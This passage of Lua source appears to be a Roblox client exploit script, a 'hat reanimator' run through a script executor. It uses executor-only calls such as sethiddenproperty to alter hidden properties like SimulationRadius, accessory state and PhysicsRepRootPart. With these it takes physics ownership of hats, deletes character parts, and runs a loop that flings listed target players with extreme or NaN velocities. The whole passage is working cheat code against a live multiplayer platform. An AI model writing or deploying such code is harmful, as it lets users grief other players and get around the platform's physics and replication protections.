		local function AttmentGet(name)
			for _,data in ipairs(HatMap) do
				if data.Attachments and data.Attachments[name] then
					return {data.Limb, data.C0 * data.C1:Inverse() * data.Attachments[name]}
				end
			end
			return Attachments[name]
		end
		for _,v in hatfors do
			for _,w in v do
				local hat = w[1]
				local map = w[2]
				local limb, c0 = unpack(AttmentGet("HatAttachment"))
				local c1 = hat.AttachmentPoint
				local handle = hat:FindFirstChild("Handle")
				if handle then
					for _,x in handle:GetChildren() do
						if x:IsA("Attachment") then
							local att = AttmentGet(x.Name)
							if att then
								limb, c0, c1 = att[1], att[2], x.CFrame
								break
							end
						end
					end
				end
				map.C0 = c0
				map.C1 = c1
				map.Limb = limb
				addhat(limb, w)
				unused += 1
			end
		end
		summary ..= "...which leaves " .. unused .. " unused."
		HatMap.Built = os.clock()
		HatMapCopy = Util.DeepcopyTable(HatMap)
		for _,v in CharHats do
			RefHatToHatRefs(v)
		end
		HatReanimator.HatMapSummary = summary
		HatReanimator.RebuildRequired = false
	end
	local function GetHatMappedOverride(hatmapped)
		local ReanimCharacter = Reanimate.Character
		if not ReanimCharacter then return end
		local scale = ReanimCharacter:GetScale()
		local hatscale = hatmapped.Scale
		-- cframe override
		for _,data in HatReanimator.HatCFrameOverride do
			if not data.Disable then
				-- accessory group
				if data.Group and hatmapped.Group == data.Group then
					if data.Limb then
						return {
							C0 = data.C0 or data.Offset or CFrame.identity,
							C1 = hatmapped.C1 * (data.C1 or CFrame.identity),
							Limb = data.Limb, RepRootPart = data.RepRootPart,
							Scale = hatscale,
						}
					else
						return {
							C0 = data.C0 or data.CFrame or CFrame.identity,
							C1 = hatmapped.C1 * (data.C1 or CFrame.identity),
							RepRootPart = data.RepRootPart,
							Scale = hatscale,
						}
					end
				end
				-- exact asset id
				if data.MeshId or data.TextureId or data.Name then
					local oke = true
					if data.MeshId then
						oke = oke and AssetIdMatch(hatmapped.MeshId, data.MeshId)
					end
					if data.TextureId then
						oke = oke and AssetIdMatch(hatmapped.TextureId, data.TextureId)
					end
					if data.Name then
						oke = oke and hatmapped.Name == data.Name
					end
					if oke then
						return {
							C0 = data.C0, C1 = data.C1,
							Offset = data.Offset or data.CFrame,
							Limb = data.Limb, RepRootPart = data.RepRootPart,
							Scale = hatscale,
						}
					end
				end
				if data.Index and hatmapped.Index == data.Index then
					return {
						C0 = data.C0 or data.CFrame or CFrame.identity,
						C1 = hatmapped.C1 * (data.C1 or CFrame.identity),
						RepRootPart = data.RepRootPart,
						Scale = hatscale,
					}
				end
			end
		end
		return hatmapped
	end
	local function GetHatMappedMeshAndTexture(mesh, tex, name)
		local ReanimCharacter = Reanimate.Character
		if not ReanimCharacter then return end
		local hatmapped = nil
		-- find hat mapping
		for _,data in ipairs(HatMap) do
			if (name and data.Name == name or not name) and data.MeshId == mesh and data.TextureId == tex then
				hatmapped = data
				break
			end
		end
		if not hatmapped then return end
		return GetHatMappedOverride(hatmapped)
	end
	local function GetHatMappedCFrame(hatmapped)
		local ReanimCharacter = Reanimate.Character
		if not ReanimCharacter then return end
		local scale = ReanimCharacter:GetScale()
		if hatmapped then
			local hatscale = hatmapped.Scale
			-- limb attached
			if hatmapped.Limb then
				local limb = ReanimCharacter:FindFirstChild(hatmapped.Limb)
				if limb and limb:IsA("BasePart") then
					-- weld-like
					if hatmapped.C0 and hatmapped.C1 then
						return limb.CFrame * Util.ScaleCFrame(hatmapped.C0, scale) * Util.ScaleCFrame(hatmapped.C1, hatscale):Inverse(), limb.Velocity
					end
					-- legacy
					if hatmapped.Offset then
						return limb.CFrame * hatmapped.Offset, limb.Velocity
					end
				end
			else
				-- world coords
				if hatmapped.C0 and hatmapped.C1 then
					return hatmapped.C0 * Util.ScaleCFrame(hatmapped.C1, hatscale):Inverse(), Vector3.zero
				end
			end
		end
		return
	end
	local function GetHatCFrameMeshAndTexture(mesh, tex, name)
		return GetHatMappedCFrame(GetHatMappedMeshAndTexture(mesh, tex, name))
	end
	local function GetHatMapped(hat)
		local handle = hat:FindFirstChild("Handle")
		if not handle or not handle:IsA("BasePart") then return end
		local mesh, tex = GetHatMeshAndTexture(hat)
		return GetHatMappedMeshAndTexture(mesh, tex, hat.Name)
	end
	local function GetHatCFrame(hat)
		local handle = hat:FindFirstChild("Handle")
		if not handle or not handle:IsA("BasePart") then return end
		local mesh, tex = GetHatMeshAndTexture(hat)
		return GetHatCFrameMeshAndTexture(mesh, tex, hat.Name)
	end
	local function GetAttachmentCFrame(name)
		local ReanimCharacter = Reanimate.Character
		if not ReanimCharacter then return end
		local scale = ReanimCharacter:GetScale()
		local hatmapped = nil
		-- find hat mapping
		for _,data in ipairs(HatMap) do
			if data.Attachments and data.Attachments[name] then
				hatmapped = data
				break
			end
		end
		if hatmapped then
			local cf = GetHatCFrameMeshAndTexture(hatmapped.MeshId, hatmapped.TextureId)
			local att = hatmapped.Attachments[name]
			return cf * Util.ScaleCFrame(att, hatmapped.Scale)
		end
		if Attachments[name] then
			local limb = ReanimCharacter:FindFirstChild(Attachments[name][1])
			if limb then
				return limb.CFrame * Util.ScaleCFrame(Attachments[name][2], scale)
			end
		end
		return
	end
	HatReanimator.GetHatMap = function() return HatMapCopy end
	HatReanimator.GetHatCFrameMeshAndTexture = GetHatCFrameMeshAndTexture
	HatReanimator.GetAttachmentCFrame = GetAttachmentCFrame

	local InitCFrame = nil
	local CurrentCharacter = nil

	HatReanimator.RebuildRequired = true
	HatReanimator.HatMapSummary = "(no hat map yet...)"
	table.clear(HatReanimator.FlingTargets)
	
	local lastsimradchange = 0
	local function SetSimulationRadius()
		local function setsimrad(plr, radius)
			pcall(function()
				plr.SimulationRadius = radius
			end)
			pcall(sethiddenproperty, plr, "SimulationRadius", radius)
		end
		--[[settings().Physics.AllowSleep = false
		settings().Physics.ThrottleAdjustTime = 0/0
		for _,plr in Players:GetPlayers() do
			local a, b = pcall(compareinstances, plr, Player)
			if a and not b then
				setsimrad(plr, 0)
			end
		end]]
		local r = #Players:GetPlayers() * 1000
		setsimrad(Player, r)
		--if os.clock() > lastsimradchange then
			--lastsimradchange = os.clock() + 1
			--pcall(replicatesignal, Player.SimulationRadiusChanged, r)
		--end
		--[[pcall(setsimulationradius, r, r)
		pcall(function()
			-- faster than findfirstchild + if then end
			sethiddenproperty(Player.Character.Humanoid, "InternalBodyScale", Vector3.new(9e9, 9e9, 9e9))
			sethiddenproperty(Player.Character.Humanoid, "InternalHeadScale", 9e9)
		end)]]
	end
	local function IsNetworkOwner(part)
		return part.ReceiveAge == 0
	end
	
	local BackendAccoutrementState = {
		None = 0,
		HasHandle = 1,
		InWorkspace = 2,
		InCharacter = 3,
		Equipped = 4,
	}
	local function SetAccoutrementState(hat, state)
		sethiddenproperty(hat, "BackendAccoutrementState", state)
	end

	local IsRespawning = false
	local function Respawn()
		if IsRespawning then return end
		IsRespawning = true
	end

	-- Credits to MyWorld for helping with netless
	local function SetUACFrameNetless(handle, dt, newcf, tvel, fling, spin)
		if dt <= 0 then return false end
		if not (handle:IsA("BasePart") and handle:IsDescendantOf(workspace)) then return false end
		local timing = os.clock()
		local idlerv = Vector3.new(
			math.sin(timing * 14), math.sin(timing * 15 + 1.0472), math.sin(timing * 16 + 2.0944)
		)
		local idleoff = idlerv * 0.001
		local ylimit = FallenPartsDestroyHeight + 5
		if newcf.Y < ylimit then
			newcf += Vector3.new(0, ylimit - newcf.Y, 0)
		end
		local speedlimit = 16384
		if fling then
			speedlimit = math.huge
		end
		local netless = Reanimate.NetlessVelocity + (math.sin(timing * 0.5) + 1) / 2
		local aligned = true
		local lastcf = handle:GetAttribute("_Uhhhhhh_LastPosition")
		local claimtime = handle:GetAttribute("_Uhhhhhh_ClaimTime")
		if typeof(lastcf) ~= "CFrame" then lastcf = handle.CFrame end
		if not handle:IsGrounded() and IsNetworkOwner(handle) then
			local newpos = newcf.Position
			local lastpos = lastcf.Position
			local vel = (newpos - lastpos) / dt
			if vel.Magnitude < 0.12 then
				newcf += idleoff
			elseif vel.Magnitude > speedlimit then
				vel = vel.Unit * speedlimit
				newpos = lastpos + vel * dt
				newcf = newcf.Rotation + newpos
				aligned = false
			end
			local rvel = lastcf:ToObjectSpace(newcf)
			local a, b = rvel:ToAxisAngle()
			rvel = (a * b) / dt
			lastcf = newcf
			if claimtime then
				if timing - claimtime < 5.67 then
					handle.Massless = false
					handle.CustomPhysicalProperties = nil
				else
					handle.Massless = true
					handle.CustomPhysicalProperties = PhysicalProperties.new(0.01, 0, 0, 0, 0)
				end
				if timing - claimtime < 0.51 then
					handle.AssemblyLinearVelocity = Vector3.new(0, netless, 0)
				else
					if fling then
						handle.AssemblyLinearVelocity = Vector3.new(16384, 16384, 16384)
					else
						-- so Patchma's netless doesn't need the velocity of the hat, just where its attached to.
						if Reanimate.UsePatchmaLikeNetless then
							vel = tvel
							vel *= Vector3.new(1, 0, 1)
							if vel.Magnitude > netless then
								vel = vel.Unit * netless
							end
							handle.AssemblyLinearVelocity = Vector3.new(vel.X * 10, netless, vel.Z * 10)
						else
							vel += tvel
							vel *= Vector3.new(1, 0, 1)
							if vel.Magnitude > netless then
								vel = vel.Unit * netless
							end
							handle.AssemblyLinearVelocity = Vector3.new(vel.X, math.max(vel.Y, netless), vel.Z)
						end
					end
				end
			else
				claimtime = timing
				handle.AssemblyLinearVelocity = Vector3.new(0, netless * 2, 0)
			end
			handle.CFrame = newcf
			if spin then
				handle.AssemblyAngularVelocity = Vector3.new(16384, 16384, 16384)
			else
				if Reanimate.UseAngularVelocity then
					handle.AssemblyAngularVelocity = rvel + idleoff
				else
					handle.AssemblyAngularVelocity = idleoff
				end
			end
		else
			claimtime = nil
			lastcf = handle.CFrame
			aligned = false
		end
		handle:SetAttribute("_Uhhhhhh_LastPosition", lastcf)
		handle:SetAttribute("_Uhhhhhh_ClaimTime", claimtime)
		return aligned
	end

	local CharOnDesc = function(v)
		if v:IsA("BasePart") and not (v:FindFirstAncestorWhichIsA("Tool") or v:FindFirstAncestorWhichIsA("Accessory")) then
			if not table.find(BaseParts, v) then
				table.insert(BaseParts, v)
			end
		elseif v:IsA("Animator") then
			task.defer(function()
				v:Destroy()
			end)
		elseif v:IsA("LocalScript") and v.Parent == Player.Character then
			v.Enabled = false
			v:GetPropertyChangedSignal("Enabled"):Connect(function()
				if v.Enabled then v.Enabled = false end
			end)
			v:GetPropertyChangedSignal("Disabled"):Connect(function()
				if not v.Disabled then v.Disabled = true end
			end)
		elseif v:IsA("Accessory") and v.Parent == Player.Character then
			local handle = v:WaitForChild("Handle", 10)
			if handle then
				if not table.find(CharHats, v) then
					table.insert(CharHats, v)
					local conn = nil
					conn = v.AncestryChanged:Connect(function()
						if v.Parent ~= Player.Character then
							local i = table.find(CharHats, v)
							if i then table.remove(CharHats, i) end
						end
					end)
				end
			end
		elseif v:IsA("Tool") and v.Parent == Player.Character then
			if not table.find(CharTools, v) then
				table.insert(CharTools, v)
				local conn = nil
				conn = v.AncestryChanged:Connect(function()
					if v.Parent ~= Player.Character then
						local i = table.find(CharTools, v)
						if i then table.remove(CharTools, i) end
					end
				end)
			end
		end
	end
	local currentping = 0
	local function _counthats(hats)
		local collidable = 0
		local exists = 0
		for _,hat in hats do
			local handle = hat:FindFirstChild("Handle")
			if handle and handle:IsA("BasePart") then
				exists += 1
				if handle.CanCollide then
					collidable += 1
					handle:SetAttribute("_Uhhhhhh_HasCollide", true)
				end
				handle.CanCollide = false
			end
		end
		HatReanimator.Status.HatCollide = exists .. " hats, " .. collidable .. " has collide."
		return collidable
	end
	local function calculatepartdestroytime(height, velocity, gravity)
		return (velocity + math.sqrt(velocity * velocity + 2 * gravity * height)) / gravity
	end
	local HatCollideMethods = {}
	HatCollideMethods[-2] = {
		NoAnim = true,
		HRPTP = function(dt, character, Humanoid, RootPosition, RootPart, readystate)
			RootPart.CFrame = CFrame.new(RootPosition + Vector3.new(0, 141, 0))
			RootPart.AssemblyLinearVelocity, RootPart.AssemblyAngularVelocity = Vector3.zero, Vector3.zero
		end,
		State1 = function(character, Humanoid, hats)
			HatReanimator.Status.HatCollide = "RCDless Mode, applying reweld to head method"
			for _,v in hats do
				SetAccoutrementState(v, BackendAccoutrementState.None)
				local att = v:FindFirstChildOfClass("Attachment")
				if att then
					att:Destroy()
				end
			end
		end,
		State2 = function(character, hats)
			local torso = character:FindFirstChild("Torso")
			if torso then torso:Destroy() end
			local root = character:FindFirstChild("HumanoidRootPart")
			if root then root:Destroy() end
			for _,v in character:GetChildren() do
				if v:IsA("BasePart") and v.Name ~= "Head" then
					v:Destroy()
				end
			end
			local head = character:FindFirstChild("Head")
			if head then head:Destroy() end
			task.wait(0.5)
			return _counthats(hats)
		end,
	}
	HatCollideMethods[-1] = {
		NoAnim = true,
		Wait1 = 0.25,
		Wait2 = 0,
		HRPTP = function(dt, character, Humanoid, RootPosition, RootPart, readystate)
			RootPart.CFrame = CFrame.new(RootPosition) * CFrame.Angles(math.pi / 2, 0, 0)
			RootPart.AssemblyLinearVelocity, RootPart.AssemblyAngularVelocity = Vector3.zero, Vector3.zero
		end,
		State1 = function() end,
		State2 = function() return 0 end,
	}
	local shownapehatdrop_lock = {}
	HatCollideMethods[0] = {
		NoAnim = false,
		HRPTP = function(dt, character, Humanoid, RootPosition, RootPart, readystate)
			if Humanoid.RigType == Enum.HumanoidRigType.R15 then
				RootPart.CFrame = CFrame.new(RootPosition + Vector3.new(0, -0.25, 0)) * CFrame.Angles(math.rad(20), 0, 0)
			else
				RootPart.CFrame = CFrame.new(RootPosition + Vector3.new(0, -0.25, 0))
			end
			RootPart.AssemblyLinearVelocity, RootPart.AssemblyAngularVelocity = Vector3.new(0, 25, 0), Vector3.zero
		end,
		State1 = function(character, Humanoid, hats)
			local anim = Instance.new("Animation")
			anim.AnimationId = "rbxassetid://180436148"
			if Humanoid.RigType == Enum.HumanoidRigType.R15 then
				anim.AnimationId = "rbxassetid://507767968"
			end
			local track = Humanoid:LoadAnimation(anim)
			track.Priority = 5
			track:Play(0)
			track:AdjustSpeed(1)
			track:AdjustWeight(1)
			track.TimePosition = 0.1
			table.clear(shownapehatdrop_lock)
			for _,v in hats do
				table.insert(shownapehatdrop_lock, v.Changed:Connect(function(p)
					if p == "BackendAccoutrementState" then
						SetAccoutrementState(v, BackendAccoutrementState.None)
					end
				end))
				SetAccoutrementState(v, BackendAccoutrementState.InCharacter)
			end
			HatReanimator.Status.HatCollide = #hats .. " hats states ERADICATED!"
		end,
		State2 = function(character, hats)
			local torso = character:FindFirstChild("Torso")
			if torso then
				torso.AncestryChanged:Wait()
			end
			HatReanimator.Status.HatCollide = "Torso removed, state unlocked."
			for _,v in shownapehatdrop_lock do
				v:Disconnect()
			end
			for _,v in hats do
				SetAccoutrementState(v, BackendAccoutrementState.Equipped)
			end
			torso = character:FindFirstChild("Head")
			if torso then
				torso.AncestryChanged:Wait()
			end
			task.wait(0.5)
			return _counthats(hats)
		end,
	}
	local function hatcol_hrptpstab(torsooffset)
		return function(dt, character, Humanoid, RootPosition, RootPart, readystate)
			local rootcf = CFrame.new(RootPosition + Vector3.new(8, -8, 0)) * CFrame.Angles(math.pi * 0.5, 0, 0)
			if readystate > 0 then
				RootPart.CFrame = rootcf
				RootPart.AssemblyLinearVelocity, RootPart.AssemblyAngularVelocity = Vector3.new(0, 26, 0), Vector3.zero
			else
				RootPart.CFrame = rootcf + Vector3.new(0, 141, 0) -- CFrame.new(RootPosition + Vector3.new(8, 141, 0))
				RootPart.AssemblyLinearVelocity, RootPart.AssemblyAngularVelocity = Vector3.new(0, 26, 0), Vector3.zero
			end
			if Humanoid.RigType == Enum.HumanoidRigType.R15 then
				for _,v in character:GetDescendants() do
					if v:IsA("Motor6D") then
						if v.Name == "Root" then
							Util.SetMotor6DOffset(v, rootcf:ToObjectSpace(CFrame.new(RootPosition + Vector3.new(0, 0.75, 0)) * CFrame.Angles(math.pi * 0.5, 0, 0) * torsooffset))
						elseif v.Name == "Neck" then
							Util.SetMotor6DOffset(v, torsooffset.Rotation:Inverse() * CFrame.new(math.random() * 0.05, 1.5, -10))
						elseif v.Name:FindFirstChild("Shoulder") or v.Name:FindFirstChild("Hip") then
							Util.SetMotor6DOffset(v, torsooffset.Rotation:Inverse() * CFrame.new(v.C0.X - v.C1.X, v.C0.Y - v.C1.Y, -0.5 + math.random() * 0.05))
						else
							Util.SetMotor6DTransform(v, CFrame.identity)
						end
					end
				end
			else
				local i = 1
				for _,v in character:GetDescendants() do
					if v:IsA("Motor6D") then
						if v.Name == "RootJoint" then
							Util.SetMotor6DOffset(v, rootcf:ToObjectSpace(CFrame.new(RootPosition + Vector3.new(0, -0.25, 0)) * CFrame.Angles(math.pi * 0.5, 0, 0) * torsooffset))
						elseif v.Name == "Neck" then
							Util.SetMotor6DOffset(v, torsooffset.Rotation:Inverse() * CFrame.new(math.random() * 0.05, 1.5, -20))
						else
							Util.SetMotor6DOffset(v, torsooffset.Rotation:Inverse() * CFrame.new(i * -3, math.random() * 0.05, -3))
							i += 1
						end
					end
				end
			end
		end
	end
	HatCollideMethods[1] = {
		NoAnim = true,
		HRPTP = hatcol_hrptpstab(CFrame.new(0, 0, 0)),
		State1 = function(character, Humanoid, hats)
			for _,v in hats do
				SetAccoutrementState(v, BackendAccoutrementState.InWorkspace)
				SetAccoutrementState(v, BackendAccoutrementState.None)
			end
			HatReanimator.Status.HatCollide = #hats .. " hats states ERADICATED!"
		end,
		State2 = function(character, hats)
			local torso = character:FindFirstChild("Torso")
			if torso then
				torso.AncestryChanged:Wait()
			end
			HatReanimator.Status.HatCollide = "Torso removed, state unlocked."
			for _,v in hats do
				SetAccoutrementState(v, BackendAccoutrementState.Equipped)
			end
			torso = character:FindFirstChild("Head")
			if torso then
				torso.AncestryChanged:Wait()
			end
			task.wait(0.5)
			return _counthats(hats)
		end,
	}
	HatCollideMethods[2] = {
		NoAnim = true,
		HRPTP = hatcol_hrptpstab(CFrame.new(0, 0, 0) * CFrame.Angles(math.pi, 0, 0)),
		State1 = HatCollideMethods[1].State1,
		State2 = HatCollideMethods[1].State2,
	}
	HatCollideMethods[3] = {
		NoAnim = true,
		HRPTP = hatcol_hrptpstab(CFrame.new(0, 0, 0) * CFrame.Angles(math.pi * -0.5, 0, 0)),
		State1 = HatCollideMethods[1].State1,
		State2 = HatCollideMethods[1].State2,
	}
	HatCollideMethods[4] = {
		NoAnim = true,
		HRPTP = hatcol_hrptpstab(CFrame.new(0, 0, 0) * CFrame.Angles(math.pi * 0.5, 0, 0)),
		State1 = HatCollideMethods[1].State1,
		State2 = HatCollideMethods[1].State2,
	}
	HatCollideMethods[5] = {
		NoAnim = true,
		HRPTP = hatcol_hrptpstab(CFrame.new(0, 0, -8)),
		State1 = HatCollideMethods[1].State1,
		State2 = HatCollideMethods[1].State2,
	}
	HatCollideMethods[6] = {
		NoAnim = true,
		HRPTP = hatcol_hrptpstab(CFrame.new(0, 0, -60)),
		State1 = HatCollideMethods[1].State1,
		State2 = HatCollideMethods[1].State2,
	}
	HatCollideMethods[7] = {
		ColLimb = true,
		NoAnim = true,
		Wait1 = 0.1,
		Wait2 = 0.15,
		HRPTP = function(dt, character, Humanoid, RootPosition, RootPart, readystate)
			local rootcf = CFrame.new(RootPosition + Vector3.new(0, -4, 0))
			RootPart.CFrame = rootcf
			RootPart.AssemblyLinearVelocity, RootPart.AssemblyAngularVelocity = Vector3.new(0, 26, 0), Vector3.zero
			if Humanoid.RigType == Enum.HumanoidRigType.R15 then
				-- TODO
			else
				-- put the limbs in freefall, make sure they dont touch
				local headheight = 3
				for _,v in character:GetDescendants() do
					if v:IsA("Motor6D") then
						if v.Name == "RootJoint" then
							Util.SetMotor6DOffset(v, CFrame.new(0, 6, 0))
						elseif v.Name == "Neck" then
							Util.SetMotor6DOffset(v, CFrame.new(0, headheight, -2))
						elseif v.Name == "Right Shoulder" then
							Util.SetMotor6DOffset(v, CFrame.new((v.C0.X - v.C1.X) * 2, headheight + 0.5, -2))
						elseif v.Name == "Left Shoulder" then
							Util.SetMotor6DOffset(v, CFrame.new((v.C0.X - v.C1.X) * 2, 0, -2))
						elseif v.Name:find("Hip") then
							Util.SetMotor6DOffset(v, CFrame.new((v.C0.X - v.C1.X) * 2, -2, -2))
						else
							Util.SetMotor6DTransform(v, CFrame.identity)
						end
					end
				end
			end
		end,
		State1 = function(character, Humanoid, hats)
			HatReanimator.Status.HatCollide = "Hat states set."
			local head = character:FindFirstChild("Head")
			for _,v in hats do
				local handle = v:FindFirstChild("Handle")
				if handle then
					local weld = handle:FindFirstChild("AccessoryWeld")
					if weld then
						if weld.Part0 == handle and weld.Part1 ~= head then
							continue
						end
						if weld.Part1 == handle and weld.Part0 ~= head then
							continue
						end
					end
				end
				SetAccoutrementState(v, BackendAccoutrementState.InWorkspace)
			end
		end,
		State2 = function(character, hats)
			local ping = Player:GetNetworkPing()
			-- 3 of the most important instances (rootpart is destroyed after a frame anyway)
			local torso = character:FindFirstChild("Torso")
			local head = character:FindFirstChild("Head")
			local rightarm = character:FindFirstChild("Right Arm") -- this will also reevaluate collisions upon removal (cuz tool)
			if torso then
				task.wait(calculatepartdestroytime(2, 26, workspace.Gravity) - 0.1)
			end
			HatReanimator.Status.HatCollide = "Torso removed, I speculate."
			for _,v in hats do
				SetAccoutrementState(v, BackendAccoutrementState.InWorkspace)
			end
			if torso and torso.Parent then
				torso.AncestryChanged:Wait()
			end
			if head and head.Parent then
				head.AncestryChanged:Wait()
			end
			task.wait(1.5)
			return _counthats(hats)
		end,
	}
	HatCollideMethods[8] = { -- VERY EXPERIMENTAL, do NOT use.
		NoAnim = true,
		Wait1 = 0.1,
		Wait2 = 0.15,
		HRPTP = function(dt, character, Humanoid, RootPosition, RootPart, readystate)
			local rootcf = CFrame.new(RootPosition + Vector3.new(0, -4, 0)) * CFrame.Angles(math.pi * 0.5, 0, 0)
			RootPart.CFrame = rootcf
			RootPart.AssemblyLinearVelocity, RootPart.AssemblyAngularVelocity = Vector3.new(0, 0, 30), Vector3.zero
			if Humanoid.RigType == Enum.HumanoidRigType.R15 then
				for _,v in character:GetDescendants() do
					if v:IsA("Motor6D") then
						if v.Name == "Root" then
							Util.SetMotor6DTransform(v, CFrame.new(0, -30, 0))
						elseif v.Name == "Neck" then
							Util.SetMotor6DOffset(v, CFrame.new(0, 67, 0))
						else
							Util.SetMotor6DTransform(v, CFrame.identity)
						end
					end
				end
			else
				local i = 1
				for _,v in character:GetDescendants() do
					if v:IsA("Motor6D") then
						if v.Name == "RootJoint" then
							Util.SetMotor6DOffset(v, CFrame.new(0, 0, -20))
						elseif v.Name == "Neck" then
							Util.SetMotor6DOffset(v, CFrame.new(0, 0, -1))
						elseif v.Name == "Right Shoulder" then
							Util.SetMotor6DOffset(v, CFrame.new(0, 0, -20))
						else
							Util.SetMotor6DOffset(v, CFrame.new(i * -3, 0, 10))
							i += 1
						end
					end
				end
			end
		end,
		State1 = function(character, Humanoid, hats)
			HatReanimator.Status.HatCollide = "Hat states set."
			local head = character:FindFirstChild("Head")
			for _,v in hats do
				local handle = v:FindFirstChild("Handle")
				if handle then
					local weld = handle:FindFirstChild("AccessoryWeld")
					if weld then
						if weld.Part1 ~= head then
							continue
						end
					end
				end
				SetAccoutrementState(v, BackendAccoutrementState.InCharacter)
			end
		end,
		State2 = function(character, hats)
			local hum = character:FindFirstChild("Humanoid")
			local head = character:FindFirstChild("Right Arm")
			HatReanimator.Status.HatCollide = "We shall remain 1 part."
			task.wait(0.41)
			for _,v in hats do
				SetAccoutrementState(v, BackendAccoutrementState.InWorkspace)
				SetAccoutrementState(v, BackendAccoutrementState.InCharacter)
			end
			task.wait(0.19)
			if head and head:IsDescendantOf(workspace) then
				head.AncestryChanged:Wait()
			end
			for _,v in hats do
				SetAccoutrementState(v, BackendAccoutrementState.Equipped)
			end
			task.wait(1.5)
			return _counthats(hats)
		end,
	}
	local NumHats = 0
	local function OnCharacter(character)
		if HatReanimator.DontFireCharAddOnThisChar == character then return end
		currentping = Player:GetNetworkPing()
		local toolnames = {}
		for _,v in CharTools do table.insert(toolnames, v.Name) end
		table.clear(BaseParts)
		table.clear(CharHats)
		table.clear(CharTools)
		ResetHatRefs()
		character.DescendantAdded:Connect(CharOnDesc)
		for _,v in character:GetDescendants() do
			CharOnDesc(v)
		end
		HatReanimator.Status.ReanimState = "Respawned."
		HatReanimator.Status.Permadeath = "Respawn detected."
		HatReanimator.Status.HatCollide = "Respawn detected."
		HatReanimator.Status.RespawnFling = "Respawn detected."
		local hatcols = HatReanimator.HatCollide
		local perma = HatReanimator.Permadeath
		HatReanimator.HasPermadeath, HatReanimator.HasHatCollide = perma, hatcols
		local hatcolmeth = HatReanimator.HatCollideMethod
		if not replicatesignal then perma = false end
		if not hatcols then hatcolmeth = -1 end
		if hatcols and RejectCharacterDeletionsDisabled then
			hatcolmeth = -2
		end
		local selhatcol = HatCollideMethods[hatcolmeth]
		CurrentCharacter = nil
		local Humanoid = character:WaitForChild("Humanoid", 10)
		if not Humanoid then return end
		if not Reanimate.UseLoadAnimationHook then
			local stupid = character:FindFirstChild("Animate")
			if stupid then
				stupid:Destroy()
			end
			character.ChildAdded:Connect(function(v)
				if v:IsA("LocalScript") then
					v.Disabled = true
					task.defer(function()
						v:Destroy()
					end)
				end
			end)
		end
		if selhatcol.NoAnim then
			local stupid = Humanoid:FindFirstChild("Animator")
			if stupid then
				stupid:Destroy()
			end
		end
		if selhatcol.ColLimb then
			Humanoid.EvaluateStateMachine = false
			Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
		end
		local RootPart = character:WaitForChild("HumanoidRootPart", 10)
		if not RootPart then return end
		local RootPosition = Vector3.new(RootPart.Position.X, FallenPartsDestroyHeight, RootPart.Position.Z)
		local ReanimCharacter = Reanimate.Character
		if ReanimCharacter then
			local root = ReanimCharacter:FindFirstChild("HumanoidRootPart")
			if root then
				RootPosition = Vector3.new(root.Position.X, FallenPartsDestroyHeight, root.Position.Z)
			end
		end
		if not workspace.StreamingEnabled and false then
			local dir = CFrame.Angles(0, math.pi * 2 * math.random(), 0).LookVector * 300
			while true do
				local nearAPlayer = false
				for _,v in Players:GetPlayers() do
					if v.Character and v.Character.PrimaryPart then
						if (RootPosition - v.Character.PrimaryPart.CFrame.Position).Magnitude < 1000 then
							nearAPlayer = true
						end
					end
				end
				if nearAPlayer then
					RootPosition += dir
				else
					break
				end
			end
		end
		if not perma then
			RootPosition += Vector3.new(0, 12, 0)
			if ReanimCharacter then
				local root = ReanimCharacter:FindFirstChild("HumanoidRootPart")
				if root then
					if HatReanimator.RespawnPosition == 1 then
						RootPosition = root.CFrame * Vector3.new(0, 0, 6)
					end
					if HatReanimator.RespawnPosition == 2 then
						local dir = Vector3.new(math.random() * 2 - 1, math.random() * 2 - 1, math.random() * 2 - 1).Unit
						if dir ~= dir or dir.Magnitude == 0 then
							dir = Vector3.yAxis
						end
						RootPosition = root.Position + dir * math.random(8, 12)
					end
				end
			end
			if HatReanimator.RespawnPosition == 3 then
				RootPosition = RootPart.Position
			end
		end
		if hatcols then
			RootPosition = Vector3.new(RootPosition.X, FallenPartsDestroyHeight, RootPosition.Z)
		end
		--pcall(function() Player.ReplicationFocus = character end)
		if hatcols then
			HatReanimator.Status.HatCollide = "Waiting for Permadeath."
		else
			HatReanimator.Status.HatCollide = "Disabled, nothing to do!"
		end
		local cdsbeffect = os.clock()
		local cdsbtime = os.clock()
		if perma then
			--replicatesignal(Player.ConnectDiedSignalBackend)
			HatReanimator.Status.Permadeath = "Fired CDSB Signal."
			cdsbeffect += Players.RespawnTime
		end
		HatReanimator.Status.RespawnFling = "Flinging targets..."
		if LimbReanimator.UseNaNFling and HatReanimator.FlingTargets[1] then
			task.wait(0.2)
		end
		while character:IsDescendantOf(workspace) do
			local t = os.clock()
			local flingtarget = HatReanimator.FlingTargets[1]
			if HatReanimator.FlingMethod == -1 then
				table.remove(HatReanimator.FlingTargets, 1)
				flingtarget = nil
			end
			if flingtarget then
				if flingtarget.Time then
					if t > flingtarget.Time then
						table.remove(HatReanimator.FlingTargets, 1)
						flingtarget = nil
					end
				else
					flingtarget.Time = t + (flingtarget.Duration or (Reanimate.UsePhysicsRepRootPart and 1 or 2))
				end
			end
			local flingcf, flinged = CFrame.identity, true
			if flingtarget then
				flingcf, flinged = Util.PredictionFling(flingtarget.Target)
				if flinged then
					table.remove(HatReanimator.FlingTargets, 1)
					flingtarget = nil
				end
			end
			if flingtarget then
				if not RootPart:IsGrounded() then
					if LimbReanimator.UseNaNFling then
						RootPart.CFrame = CFrame.new(flingcf.Position + Vector3.new(0, 0, math.random(0, 1) * 0.005)) * CFrame.Angles(0, os.clock() * 15, 0)
						RootPart.Velocity, RootPart.RotVelocity = Vector3.zero, Vector3.zero
					else
						RootPart.CFrame = flingcf + Vector3.new(0, 0, math.random(0, 1) * 0.005)
						RootPart.Velocity, RootPart.RotVelocity = Vector3.new(0, -16384, 0), Vector3.one * 16384
					end
					pcall(sethiddenproperty, RootPart, "PhysicsRepRootPart", Reanimate.UsePhysicsRepRootPart and Util.PredictionFlingPart(flingtarget.Target) or nil)
				end
				Humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
				if LimbReanimator.UseNaNFling then
					pcall(sethiddenproperty, Humanoid, "MoveDirectionInternal", Vector3.new(0/0, 0/0, 0/0))
				end
			elseif #HatReanimator.FlingTargets == 0 then
				break
			else
				RootPart.CFrame = CFrame.new(0, 1000, 0)
				RootPart.Velocity, RootPart.RotVelocity = Vector3.zero, Vector3.zero
				Humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
			end
			task.wait()
		end
		if not character:IsDescendantOf(workspace) then
			return
		end
		pcall(sethiddenproperty, RootPart, "PhysicsRepRootPart", nil)
